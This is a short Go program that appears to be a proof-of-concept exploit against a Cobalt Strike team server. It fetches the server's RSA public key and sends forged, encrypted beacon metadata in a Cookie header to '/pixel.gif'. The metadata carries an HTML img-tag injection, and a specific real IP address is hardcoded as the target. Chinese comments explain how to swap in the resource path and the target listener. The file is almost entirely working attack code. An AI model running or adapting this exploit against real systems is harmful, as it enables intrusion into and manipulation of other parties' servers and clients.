package main

import (
	"CSPOC/utils"
	"encoding/base64"
	"fmt"
	"net/http"
)

func main() {
	poc := "\x00\x00\xbe\xef\x00\x00\x00e\x0b\x00\x04\r\x0e\x0f\x0e\x0f\x0c\x0e\x02\x0f\x08\x07\x03\x05\xa8\x03\xa8\x03\x00" +
		"<\xe5\xee\x00\x00\xb4c\x00\x00\x04\x06\x02#\xf0\x00\x00\x00\x00v\x91\n`v\x90\xf5P\x0c\r\n\x02ZTian\t<html><img src=http://124.70.40.185/logo.png>\ta" //替换资源路径 不宜过长

	url := "http://124.70.40.185:8500" //目标HTTP监听，如 http://127.0.0.1:8100
	publicKey := `
-----BEGIN PUBLIC KEY-----
` + utils.GetPublicKey(url) + `
-----END PUBLIC KEY-----`
	rsaData := utils.RsaEncoding(poc, publicKey)
	if rsaData == nil {
		panic("rsa public key error")
	}
	request, err := http.NewRequest("GET", url+"/pixel.gif", nil)
	if err != nil {
		return
	}
	request.Header.Add("Cookie", base64.StdEncoding.EncodeToString(rsaData))
	do, err := http.DefaultClient.Do(request)
	if err != nil {
		return
	}
	fmt.Println(do.StatusCode)
}
